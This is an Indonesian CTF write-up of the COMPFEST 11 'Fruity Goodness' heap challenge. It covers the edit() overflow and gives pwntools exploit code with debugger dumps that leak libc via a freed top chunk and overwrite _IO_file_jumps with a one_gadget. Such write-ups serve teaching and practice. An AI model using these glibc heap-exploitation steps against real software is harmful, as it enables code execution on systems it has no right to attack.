<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width"><title>COMPFEST 11 Final - Fruity Goodness | circleous</title><link rel=stylesheet href=/css/main.min.480e0ef6c6aac53eaf38419259058419b9323d67397f61cf2d8ce892d869c560.css integrity="sha256-SA4O9saqxT6vOEGSWQWEGbkyPWc5f2HPLYzokthpxWA=" crossorigin=anonymous><link rel=stylesheet href=/css/codes.min.212a1080bdb9f68724a4aff8ef71b5bf08e662a8f5ef70b13d4d94330d804899.css integrity="sha256-ISoQgL259ockpK/473G1vwjmYqj173CxPU2UMw2ASJk=" crossorigin=anonymous></head><body><header><h1><a href=/>circleous</a></h1><nav><ul><li><a href=/>Home</a></li><li><a aria-current=true class=ancestor href=/posts/>Posts</a></li><li><a href=/tags/>Tags</a></li></ul></nav></header><main><article><header><h1>COMPFEST 11 Final - Fruity Goodness</h1><time datetime=2019-09-09T00:00:00+07:00>September 9, 2019</time></header><blockquote><p>hanya soal ini yang saya selesaikan selama ctf berlangsung, sad af.</p></blockquote><h1 id=analisa>analisa</h1><pre><code>==================================================
WELCOME TO FRUIT WAR v6.9
I'm still a noob C coder :(, please report any bugs you find
I'm also poor so i cant pay you :(
Hopefully you have fun!
==================================================
1. I want a new fruit
2. I want to train my fruit
3. I want to list all my fruits
4. I want out :(
Your choice:
</code></pre><p>Soal heap dengan fungsi <code>view()</code>, <code>add()</code>, dan <code>edit()</code>, tanpa free/<code>delete()</code>. Struktur dari <code>fruit</code>,</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#bb9af7>struct</span> fruit {
</span></span><span style=display:flex><span>    <span style=color:#41a6b5>int</span> coolness;
</span></span><span style=display:flex><span>    <span style=color:#41a6b5>int</span> tastiness;
</span></span><span style=display:flex><span>    <span style=color:#41a6b5>int</span> number;
</span></span><span style=display:flex><span>    <span style=color:#41a6b5>char</span><span style=color:#9ece6a;font-weight:700>*</span> name;
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>struct</span> fruit <span style=color:#9ece6a;font-weight:700>*</span>next_fruit;
</span></span><span style=display:flex><span>    <span style=color:#41a6b5>int</span> level;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Ada sedikit twist pada bagian <code>edit()</code> (menu train pada soal), dimana hanya bisa mengubah nama <code>fruit</code> ketika <code>fruit</code> coolneess dan tastiness lebih dari 50. Untuk menaikkan nilai coolneess dan tastiness ini, <code>fruit</code> perlu ditrain terlebih dahulu dengan pertambahan nilai yang random.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>fruit_to_train<span style=color:#9ece6a;font-weight:700>-&gt;</span>coolness <span style=color:#9ece6a;font-weight:700>+=</span> <span style=color:#7aa2f7>rand</span>() <span style=color:#9ece6a;font-weight:700>%</span> <span style=color:#e0af68>10</span> <span style=color:#9ece6a;font-weight:700>+</span> <span style=color:#e0af68>1</span>;
</span></span><span style=display:flex><span>fruit_to_train<span style=color:#9ece6a;font-weight:700>-&gt;</span>tastiness <span style=color:#9ece6a;font-weight:700>+=</span> <span style=color:#7aa2f7>rand</span>() <span style=color:#9ece6a;font-weight:700>%</span> <span style=color:#e0af68>10</span> <span style=color:#9ece6a;font-weight:700>+</span> <span style=color:#e0af68>1</span>;
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span><span style=color:#bb9af7>if</span> ( fruit_to_train<span style=color:#9ece6a;font-weight:700>-&gt;</span>coolness <span style=color:#9ece6a;font-weight:700>&lt;=</span> <span style=color:#e0af68>49</span> <span style=color:#9ece6a;font-weight:700>||</span> fruit_to_train<span style=color:#9ece6a;font-weight:700>-&gt;</span>tastiness <span style=color:#9ece6a;font-weight:700>&lt;=</span> <span style=color:#e0af68>49</span> ) {
</span></span><span style=display:flex><span>    <span style=color:#7aa2f7>puts</span>(<span style=color:#9ece6a>&#34;Fruit Trained!&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Bug terletak pada bagian <code>edit()</code>, karena dapat mengubah nama <code>fruit</code> tanpa ada batasan panjang yang sesuai pada pembuatan pertamanya.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#7aa2f7>puts</span>(<span style=color:#9ece6a>&#34;Would you like to rename this fruit? (y/n)&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#7aa2f7>fgets</span>(choice, <span style=color:#e0af68>5</span>, stdin);
</span></span><span style=display:flex><span><span style=color:#bb9af7>if</span> ( <span style=color:#7aa2f7>strchr</span>(choice, <span style=color:#9ece6a>&#39;y&#39;</span>) ) {
</span></span><span style=display:flex><span>    <span style=color:#7aa2f7>puts</span>(<span style=color:#9ece6a>&#34;How long do you want this fruit&#39;s name to be? (Max 4096 characters)&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#7aa2f7>scanf</span>(<span style=color:#9ece6a>&#34;%d&#34;</span>, <span style=color:#9ece6a;font-weight:700>&amp;</span>length);
</span></span><span style=display:flex><span>    <span style=color:#7aa2f7>getchar</span>();
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>if</span> ( length <span style=color:#9ece6a;font-weight:700>&gt;</span> <span style=color:#e0af68>4096</span> ) {
</span></span><span style=display:flex><span><span style=color:#7aa2f7>puts</span>(<span style=color:#9ece6a>&#34;NO! BAD!&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#7aa2f7>exit</span>(<span style=color:#9ece6a;font-weight:700>-</span><span style=color:#e0af68>1</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    fruit_number <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#7aa2f7>alloca</span>(<span style=color:#e0af68>16</span> <span style=color:#9ece6a;font-weight:700>*</span> ((length <span style=color:#9ece6a;font-weight:700>+</span> <span style=color:#e0af68>15LL</span>) <span style=color:#9ece6a;font-weight:700>/</span> <span style=color:#e0af68>0x10uLL</span>));
</span></span><span style=display:flex><span>    p_new_name <span style=color:#9ece6a;font-weight:700>=</span> (<span style=color:#41a6b5>char</span> (<span style=color:#9ece6a;font-weight:700>*</span>)[])<span style=color:#9ece6a;font-weight:700>&amp;</span>fruit_number;
</span></span><span style=display:flex><span>    <span style=color:#7aa2f7>puts</span>(<span style=color:#9ece6a>&#34;What do you want this fruit&#39;s name to be?&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#7aa2f7>read</span>(<span style=color:#e0af68>0</span>, p_new_name, length);
</span></span><span style=display:flex><span>    <span style=color:#7aa2f7>strncpy</span>(fruit_to_train<span style=color:#9ece6a;font-weight:700>-&gt;</span>name, p_new_name, length);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h1 id=exploit>exploit</h1><p>Berikut beberapa fungsi untuk memudahkan interaksi dengan soal,</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#bb9af7>def</span> <span style=color:#7aa2f7>add</span>(length, name):
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>sendlineafter(<span style=color:#9ece6a>&#39;choice:</span><span style=color:#7aa2f7>\n</span><span style=color:#9ece6a>&#39;</span>, <span style=color:#9ece6a>&#39;1&#39;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>sendlineafter(<span style=color:#9ece6a>&#39;)</span><span style=color:#7aa2f7>\n</span><span style=color:#9ece6a>&#39;</span>, <span style=color:#9ece6a>str</span>(length))
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>sendlineafter(<span style=color:#9ece6a>&#39;?</span><span style=color:#7aa2f7>\n</span><span style=color:#9ece6a>&#39;</span>, name)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#bb9af7>def</span> <span style=color:#7aa2f7>train</span>(idx, length, name):
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>sendlineafter(<span style=color:#9ece6a>&#39;choice:</span><span style=color:#7aa2f7>\n</span><span style=color:#9ece6a>&#39;</span>, <span style=color:#9ece6a>&#39;2&#39;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>sendlineafter(<span style=color:#9ece6a>&#39;train?</span><span style=color:#7aa2f7>\n</span><span style=color:#9ece6a>&#39;</span>, <span style=color:#9ece6a>str</span>(idx))
</span></span><span style=display:flex><span>    cond <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a>&#39;Trained!&#39;</span> <span style=color:#9ece6a;font-weight:700>in</span> r<span style=color:#9ece6a;font-weight:700>.</span>recvline(<span style=color:#e0af68>0</span>)
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>while</span> cond:
</span></span><span style=display:flex><span>r<span style=color:#9ece6a;font-weight:700>.</span>sendlineafter(<span style=color:#9ece6a>&#39;choice:</span><span style=color:#7aa2f7>\n</span><span style=color:#9ece6a>&#39;</span>, <span style=color:#9ece6a>&#39;2&#39;</span>)
</span></span><span style=display:flex><span>r<span style=color:#9ece6a;font-weight:700>.</span>sendlineafter(<span style=color:#9ece6a>&#39;train?</span><span style=color:#7aa2f7>\n</span><span style=color:#9ece6a>&#39;</span>, <span style=color:#9ece6a>str</span>(idx))
</span></span><span style=display:flex><span>tmp <span style=color:#9ece6a;font-weight:700>=</span> r<span style=color:#9ece6a;font-weight:700>.</span>recvline(<span style=color:#e0af68>0</span>)
</span></span><span style=display:flex><span>cond <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a>&#39;Trained!&#39;</span> <span style=color:#9ece6a;font-weight:700>in</span> tmp
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>sendlineafter(<span style=color:#9ece6a>&#39;)</span><span style=color:#7aa2f7>\n</span><span style=color:#9ece6a>&#39;</span>, <span style=color:#9ece6a>&#39;y&#39;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>sendlineafter(<span style=color:#9ece6a>&#39;)</span><span style=color:#7aa2f7>\n</span><span style=color:#9ece6a>&#39;</span>, <span style=color:#9ece6a>str</span>(length))
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>sendlineafter(<span style=color:#9ece6a>&#39;?</span><span style=color:#7aa2f7>\n</span><span style=color:#9ece6a>&#39;</span>, name)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#bb9af7>def</span> <span style=color:#7aa2f7>view</span>():
</span></span><span style=display:flex><span>    r<span style=color:#9ece6a;font-weight:700>.</span>sendlineafter(<span style=color:#9ece6a>&#39;choice:</span><span style=color:#7aa2f7>\n</span><span style=color:#9ece6a>&#39;</span>, <span style=color:#9ece6a>&#39;3&#39;</span>)
</span></span><span style=display:flex><span>    dump <span style=color:#9ece6a;font-weight:700>=</span> []
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>while</span> <span style=color:#9ece6a>&#39;1. I want a new fruit&#39;</span> <span style=color:#9ece6a;font-weight:700>not</span> <span style=color:#9ece6a;font-weight:700>in</span> r<span style=color:#9ece6a;font-weight:700>.</span>recvline(<span style=color:#e0af68>0</span>):
</span></span><span style=display:flex><span>c <span style=color:#9ece6a;font-weight:700>=</span> []
</span></span><span style=display:flex><span>tmp <span style=color:#9ece6a;font-weight:700>=</span> r<span style=color:#9ece6a;font-weight:700>.</span>recvline(<span style=color:#e0af68>0</span>)
</span></span><span style=display:flex><span><span style=color:#bb9af7>while</span> <span style=color:#9ece6a>&#39;========================================&#39;</span> <span style=color:#9ece6a;font-weight:700>not</span> <span style=color:#9ece6a;font-weight:700>in</span> tmp:
</span></span><span style=display:flex><span>    c<span style=color:#9ece6a;font-weight:700>.</span>append(tmp<span style=color:#9ece6a;font-weight:700>.</span>split(<span style=color:#9ece6a>&#39;: &#39;</span>))
</span></span><span style=display:flex><span>    tmp <span style=color:#9ece6a;font-weight:700>=</span> r<span style=color:#9ece6a;font-weight:700>.</span>recvline(<span style=color:#e0af68>0</span>)
</span></span><span style=display:flex><span>dump<span style=color:#9ece6a;font-weight:700>.</span>append(c)
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>return</span> dump
</span></span></code></pre></div><p>Ide pertamanya adalah mendapatkan leak libc dengan unsorted bin free list. Iya, walaupun gak ada <code>free()</code> di soal, free ini bisa didapat dengan mengalokasi chunk yang lebih besar daripada top chunk, cek lebih lanjut di stage 1 <a href=https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_orange.c>house of orange</a>. btw, karena ada batasan malloc sebesar 0x1000, ubah dulu top chunk size jadi dibawah 0x1000.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span>add(<span style=color:#e0af68>0x48</span>, <span style=color:#9ece6a>&#39;A&#39;</span> <span style=color:#9ece6a;font-weight:700>*</span> <span style=color:#e0af68>0x47</span>)
</span></span><span style=display:flex><span>add(<span style=color:#e0af68>0x18</span>, <span style=color:#9ece6a>&#39;B&#39;</span> <span style=color:#9ece6a;font-weight:700>*</span> <span style=color:#e0af68>0x17</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>#  pwndbg&gt; dq *(long*)$rebase(&amp;first_fruit) 40</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 0000555555559260     0000000000000000 0000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 0000555555559270     0000555555559290 00005555555592e0</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 0000555555559280     0000000000000000 0000000000000051</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 0000555555559290     4141414141414141 4141414141414141</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00005555555592a0     4141414141414141 4141414141414141</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00005555555592b0     4141414141414141 4141414141414141</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00005555555592c0     4141414141414141 4141414141414141</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00005555555592d0     0041414141414141 0000000000000031</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00005555555592e0     0000000000000000 0000000000000001</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00005555555592f0     0000555555559310 0000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 0000555555559300     0000000000000000 0000000000000021</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 0000555555559310     4242424242424242 4242424242424242</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 0000555555559320     0042424242424242 0000000000020ce1 &lt;--- top chunk 0x20ce1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload  <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a>&#39;B&#39;</span> <span style=color:#9ece6a;font-weight:700>*</span> <span style=color:#e0af68>0x18</span>
</span></span><span style=display:flex><span>payload <span style=color:#9ece6a;font-weight:700>+=</span> <span style=color:#9ece6a>&#39;</span><span style=color:#7aa2f7>\xe1\x0c\x00</span><span style=color:#9ece6a>&#39;</span> <span style=color:#414868;font-style:italic># 0xce1</span>
</span></span><span style=display:flex><span>train(<span style=color:#e0af68>1</span>, <span style=color:#9ece6a>len</span>(payload), payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># pwndbg&gt; dq *(long*)$rebase(&amp;first_fruit) 40</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># ...</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00005555555592f0     0000555555559310 0000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 0000555555559300     0000000000000001 0000000000000021</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 0000555555559310     4242424242424242 4242424242424242</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 0000555555559320     4242424242424242 0000000000000ce1 &lt;--- top chunk 0x20ce1</span>
</span></span></code></pre></div><p>Seharusnya alokasi malloc dengan ukuran lebih dari 0xce0, akan membuat heap pada page baru dan top chunk sebelumnya akan di free dan masuk ke unsorted bin.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span>add(<span style=color:#e0af68>0xcf8</span>, <span style=color:#9ece6a>&#39;C&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># pwndbg&gt; dq *(long*)$rebase(&amp;first_fruit) 40</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># ...</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00005555555592f0     0000555555559310 0000555555559330</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 0000555555559300     0000000000000001 0000000000000021</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 0000555555559310     4242424242424242 4242424242424242</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 0000555555559320     4242424242424242 0000000000000031</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 0000555555559330     0000000000000000 0000000000000002</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 0000555555559340     000055555557a010 0000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 0000555555559350     0000000000000000 0000000000000c91</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 0000555555559360     000015555551cca0 000015555551cca0 &lt;--- libc leak</span>
</span></span></code></pre></div><p>untuk dapetin leak-nya ubah <code>fruit->name</code> ke <code>...360</code>. <code>fruit->name</code> di entri ke 1 sudah menunjuk ke <code>...310</code> jadi yang perlu diubah hanya LSB-nya saja dari <code>0x10</code> jadi <code>0x60</code>.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span>payload  <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a>&#39;A&#39;</span> <span style=color:#9ece6a;font-weight:700>*</span> <span style=color:#e0af68>0x60</span>
</span></span><span style=display:flex><span>payload <span style=color:#9ece6a;font-weight:700>+=</span> <span style=color:#9ece6a>&#39;</span><span style=color:#7aa2f7>\x60</span><span style=color:#9ece6a>&#39;</span>
</span></span><span style=display:flex><span>train(<span style=color:#e0af68>0</span>, <span style=color:#9ece6a>len</span>(payload), payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># pwndbg&gt; dq *(long*)$rebase(&amp;first_fruit) 40</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># ...</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00005555555592d0     4141414141414141 4141414141414141</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00005555555592e0     4141414141414141 4141414141414141</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 00005555555592f0     0000555555559360 0000555555559330</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 0000555555559300     0000000000000001 0000000000000021</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 0000555555559310     4242424242424242 4242424242424242</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 0000555555559320     4242424242424242 0000000000000031</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 0000555555559330     0000000000000000 0000000000000002</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 0000555555559340     000055555557a010 0000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 0000555555559350     0000000000000000 0000000000000c91</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 0000555555559360     000015555551cca0 000015555551cca0</span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># 0000555555559370     0000000000000000 0000000000000000</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>leak <span style=color:#9ece6a;font-weight:700>=</span> view()
</span></span><span style=display:flex><span>leak <span style=color:#9ece6a;font-weight:700>=</span> leak[<span style=color:#e0af68>1</span>][<span style=color:#e0af68>1</span>][<span style=color:#e0af68>1</span>][:<span style=color:#e0af68>6</span>]
</span></span><span style=display:flex><span>leak <span style=color:#9ece6a;font-weight:700>=</span> u64(leak<span style=color:#9ece6a;font-weight:700>.</span>ljust(<span style=color:#e0af68>8</span>, <span style=color:#9ece6a>&#39;</span><span style=color:#7aa2f7>\x00</span><span style=color:#9ece6a>&#39;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>libc<span style=color:#9ece6a;font-weight:700>.</span>address <span style=color:#9ece6a;font-weight:700>=</span> leak <span style=color:#9ece6a;font-weight:700>-</span> <span style=color:#e0af68>0x1e4ca0</span>
</span></span><span style=display:flex><span><span style=color:#9ece6a>print</span> <span style=color:#9ece6a>&#39;libc&#39;</span>, <span style=color:#9ece6a>hex</span>(libc<span style=color:#9ece6a;font-weight:700>.</span>address)
</span></span></code></pre></div><p>Karena sudah mendapatkan leak libc, seharusnya sudah lebih mudah karena yang perlu dilakukan hanya mengubah <code>fruit->next_fruit->name</code> ke salah satu hook atau vtable di libc. Setelah itu tinggal ubah(<code>edit()</code>) nama di <code>fruit->next_fruit</code> jadi <code>one_gadget</code>. Pada exploit ini, saya menggunakan vtable dari std I/O, <code>_IO_file_jump</code>.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span>payload  <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a>&#39;A&#39;</span> <span style=color:#9ece6a;font-weight:700>*</span> <span style=color:#e0af68>0x60</span>
</span></span><span style=display:flex><span>payload <span style=color:#9ece6a;font-weight:700>+=</span> p64(libc<span style=color:#9ece6a;font-weight:700>.</span>address <span style=color:#9ece6a;font-weight:700>+</span> <span style=color:#e0af68>0x1e65d8</span>) <span style=color:#414868;font-style:italic># _IO_file_jump</span>
</span></span><span style=display:flex><span>train(<span style=color:#e0af68>0</span>, <span style=color:#9ece6a>len</span>(payload), payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload  <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9ece6a>&#39;A&#39;</span> <span style=color:#9ece6a;font-weight:700>*</span> <span style=color:#e0af68>0x58</span>
</span></span><span style=display:flex><span>payload <span style=color:#9ece6a;font-weight:700>+=</span> p64(<span style=color:#e0af68>1</span>)
</span></span><span style=display:flex><span>train(<span style=color:#e0af68>0</span>, <span style=color:#9ece6a>len</span>(payload), payload) <span style=color:#414868;font-style:italic># fix fruit-&gt;next_fruit-&gt;number</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload  <span style=color:#9ece6a;font-weight:700>=</span> p64(libc<span style=color:#9ece6a;font-weight:700>.</span>address <span style=color:#9ece6a;font-weight:700>+</span> <span style=color:#e0af68>0x106ef8</span>) <span style=color:#414868;font-style:italic># one_gadget</span>
</span></span></code></pre></div><p>profit.</p><h1 id=the-real-challenge-dan-sedikit-rant>the real challenge dan sedikit rant</h1><p>Soal ini terlihat mudah pada awalnya, tapi saya terjebak pada tahap akhir untuk mencari function pointer yang dapat dioverwrite pada libc. Teknik <em>spray n pray</em> disini juga ga bisa digunakan karena saat <code>edit()</code>, <code>read()</code> tidak langsung ke <code>fruit->name</code>, tapi lewat value di stack terlebih dahulu lalu <code>strncpy()</code> setelahnya ke heap. <code>strncpy</code> ini akan men-copy null terminated string dari src ke dst. plus, Pointer x86_64 selalu memiliki null dan itulah sebabnya kenapa tidak bisa spray one_gadget di libc.</p><p>read(0, p_new_name, length);
strncpy(fruit_to_train->name, p_new_name, length);</p><p>btw, saya baru ingat kalau vtable std I/O, <code>_IO_file_jump</code> ini writeable setelah membaca salah satu writeup dari bushwhackers - <a href=https://blog.bushwhackers.ru/tokyo2019-printf/>TokyoWesterns CTF 2019 - printf</a>, tapi sayangnya ini baru teringat pas 10 menit menjelang selesai.</p><p>Lepas dari masalah mencari pointer yang bisa dioverwrite, <em>the real challenge</em> sebenarnya adalah membuat exploit ini lebih cepat karena <code>usleep</code> yang lumayan lama saat setiap kali <code>edit()</code>. Ini sebenarnya lebih mengganggu menurut saya karena terbukti selama 5 menit terakhir saya hanya mendapatkan 2 flag dari lawan, plus, instance pada soal ini yang hidup hanya beberapa dari semua tim (tidak ada waktu untuk lapor ke panitia >.&lt;). btw, mungkin ini lebih kepada saran kepada para challenge designer kedepannya, kalau memang tidak menyangkut bagaimana soal ini dapat diselesaikan, lebih baik tidak ditambahkan kalau bisa :). Bukan menyalahkan penggunaan <code>usleep</code> disini karena untuk soal jeopardy yang bisa fire and forget, time limit bisa tidak perlu dipedulikan, tapi untuk attack defense yang menyangkut dengan tick dsb… ¯\_(ツ)_/¯</p><div><div>Tags:</div><ul><li><a href=/tags/ctf-writeup/>Ctf-Writeup</a></li><li><a href=/tags/pwn/>Pwn</a></li></ul></div></article></main><footer><p>&copy; 2025 circleous. Licensed under <a href=https://creativecommons.org/publicdomain/zero/1.0/ target=_blank>CC0</a>.</p></footer></body></html>